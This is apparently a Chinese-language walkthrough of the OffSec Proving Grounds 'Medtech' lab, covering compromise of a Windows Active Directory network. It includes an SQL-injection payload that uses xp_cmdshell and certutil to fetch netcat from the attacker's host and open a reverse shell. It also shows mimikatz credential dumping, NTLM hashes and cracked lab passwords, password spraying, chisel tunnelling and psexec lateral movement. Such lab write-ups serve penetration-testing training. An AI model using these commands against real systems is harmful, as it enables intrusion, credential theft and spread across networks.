---
title: Proving Grounds Practive-Challenge 1 - Medtech
date: 2025-9-11 20:00:00
tags: 红队
categories: 红队打靶-Windows_Active
---

# 信息收集

**192.168.167.120**

![image-20250912175711684](./Challenge%201%20-%20Medtech/image-20250912175711684.png)

**192.168.167.121**

![image-20250912175736628](./Challenge%201%20-%20Medtech/image-20250912175736628.png)

**192.168.167.122**

![image-20250912175753424](./Challenge%201%20-%20Medtech/image-20250912175753424.png)

# 121主机-web服务

这里的登录服务会报错，存在sql注入

![image-20250912203406451](./Challenge%201%20-%20Medtech/image-20250912203406451.png)

用`sqlmap`注了一下是`mssql`,测试了一下xp_cmdshell可以进行命令执行，因为没有回显，可以先用ping测试一下这个函数是否能用，本地启动tcpdump监听就可以了

```
admin' ;exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.222:8000/nc64.exe C:\temp\nc.exe'--%20

admin' ;exec xp_cmdshell 'C:\temp\nc.exe -e cmd 192.168.45.222 80'--%20
```

![image-20250912203914842](./Challenge%201%20-%20Medtech/image-20250912203914842.png)

![image-20250912205407193](./Challenge%201%20-%20Medtech/image-20250912205407193.png)

**利用：**

[Release PrintSpoofer · itm4n/PrintSpoofer](./https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)下载PrintSpoofer.exe



上传到靶机

```
运行：.\PrintSpoofer64.exe -i -c powershell.exe
```

成功提权

![image-20250912205603686](./Challenge%201%20-%20Medtech/image-20250912205603686.png)

查看本地用户和域用户

![image-20250912211150255](./Challenge%201%20-%20Medtech/image-20250912211150255.png)

使用mimikatz导出密码

知道了一个域用户的账号密码`joe:Flowers1`

在mimikatz中运行`privilege::debug`--`token::elevate`-`sekurlsa::logonpasswords`

![image-20250913112327912](./Challenge%201%20-%20Medtech/image-20250913112327912.png)

![image-20250912211543258](./Challenge%201%20-%20Medtech/image-20250912211543258.png)

joe是个域用户`joe:Flowers1`

运行`lsadump::sam`

`offsec`的`ntlm`用`hashcat`爆破之后密码为`lab`

![image-20250912211850315](./Challenge%201%20-%20Medtech/image-20250912211850315.png)

# 爆破122主机ssh

122主机只开启了22端口和openvpn

利用上面得到的offsec用户名对122主机的ssh进行爆破

![image-20250913111901670](./Challenge%201%20-%20Medtech/image-20250913111901670.png)

这个shell是受限的，只能执行一些指定的命令，运行`sudo -l`之后有openvpn的sudo权限

![image-20250913113344501](./Challenge%201%20-%20Medtech/image-20250913113344501.png)

按照gtfobins中的提示即可提权

![image-20250913113442132](./Challenge%201%20-%20Medtech/image-20250913113442132.png)

![image-20250913113453229](./Challenge%201%20-%20Medtech/image-20250913113453229.png)

并且在home目录下`mario/.ssh`中有ssh私钥，通过查看`known_hosts`也可以知道是有两个可以连接的主机的

![image-20250913120901649](./Challenge%201%20-%20Medtech/image-20250913120901649.png)

![image-20250913122511914](./Challenge%201%20-%20Medtech/image-20250913122511914.png)

将私钥保存下来，后续可以爆破ssh用

# 内网网段-11主机

使用chisel或者frp搭建个socks隧道，然后配置一下`/etc/proxychains`就可以了

```
./chisel server --port 8888 --socks5 --reverse

 .\chisel_1.10.1_windows_amd64.exe client --max-retry-count 1 192.168.45.222:8888 R:socks
```

通过上面知道的joe域用户的密码，爆破内网主机是否有可以直接远程登录的

```
proxychains crackmapexec winrm 172.16.236.10/24 -u joe -p Flowers1 -d medtech.com
```

![image-20250913121002077](./Challenge%201%20-%20Medtech/image-20250913121002077.png)

![image-20250913121028348](./Challenge%201%20-%20Medtech/image-20250913121028348.png)

并且joe属于管理员组

![image-20250913123810439](./Challenge%201%20-%20Medtech/image-20250913123810439.png)

当前目录下有`fileMonitorBackup.log`文件，打印后其中有一些NTLM值

![image-20250913121916304](./Challenge%201%20-%20Medtech/image-20250913121916304.png)

```
daisy    abf36048c1cf88f5603381c5128feb8e
toad     5be63a865b65349851c1f11a067a3068
wario    fdf36048c1cf88f5630381c5e38feb8e		Mushroom!
goomba   8e9e1516818ce4e54247e71e71b5f436
```

# 内网网段14主机

上面122主机中的私钥，保存到本地给上600权限之后

可以登录到14主机

![image-20250913125243627](./Challenge%201%20-%20Medtech/image-20250913125243627.png)

# 密码喷射

## winrm-83主机

利用域用户和现有的密码进行密码喷射

![image-20250913131126933](./Challenge%201%20-%20Medtech/image-20250913131126933.png)

可以直接远程登录到83主机

运行`winPEASx64.exe`寻找提权路径,这个文件任何人都有操作权限，将文件改为反向shell

然后运行就可以得到系统权限

![image-20250913134735798](./Challenge%201%20-%20Medtech/image-20250913134735798.png)



## smb-82主机

对其他主机的smb也进行密码喷射

![image-20250913134416289](./Challenge%201%20-%20Medtech/image-20250913134416289.png)

![image-20250913134424787](./Challenge%201%20-%20Medtech/image-20250913134424787.png)

![image-20250913134434454](./Challenge%201%20-%20Medtech/image-20250913134434454.png)

![image-20250913134441603](./Challenge%201%20-%20Medtech/image-20250913134441603.png)

![image-20250913134518046](./Challenge%201%20-%20Medtech/image-20250913134518046.png)

![image-20250913140021058](./Challenge%201%20-%20Medtech/image-20250913140021058.png)

```
proxychains impacket-psexec medtech.com/yoshi:'Mushroom!'@172.16.236.82
```

- 目标主机开启445端口
- 目标主机开启IPC$和非IPC$的任意可写共享
- 开启admin$共享

用psexec挨个尝试，可以直接连接到82主机，并且直接是系统权限

![image-20250913140300060](./Challenge%201%20-%20Medtech/image-20250913140300060.png)

# rdp-12主机

12主机无法使用139和445端口进行远程连接

12主机开启了rdp远程桌面，![image-20250913140908090](./Challenge%201%20-%20Medtech/image-20250913140908090.png)

然后使用crackmapexec去爆破就好，最终爆出来账号密码为:`yoshi:Mushroom!`

上传winPEASx64.exe尝试提权

backup.exe是定时任务，替换为shell.exe就可以得到系统权限，然后运行mimikatz得到`leon:rabbit:)`

我也是找不到这个定时任务，看其他wp，有的可以有的不可以

# winrm-13主机

13主机可以用刚才mimikatz找到的账号密码直接远程连接

![image-20250913143806317](./Challenge%201%20-%20Medtech/image-20250913143806317.png)

# psexec-10主机

开放445和139，尝试psexec

![image-20250913144017043](./Challenge%201%20-%20Medtech/image-20250913144017043.png)

成功登录还是系统权限

![image-20250913144039254](./Challenge%201%20-%20Medtech/image-20250913144039254.png)

桌面有web1的凭证

![image-20250913144141725](./Challenge%201%20-%20Medtech/image-20250913144141725.png)

# ssh-120主机

通过上面的凭证使用ssh即可登录

sudo -l发现都不要密码就能执行，直接sudo su提权到root

![image-20250913144336030](./Challenge%201%20-%20Medtech/image-20250913144336030.png)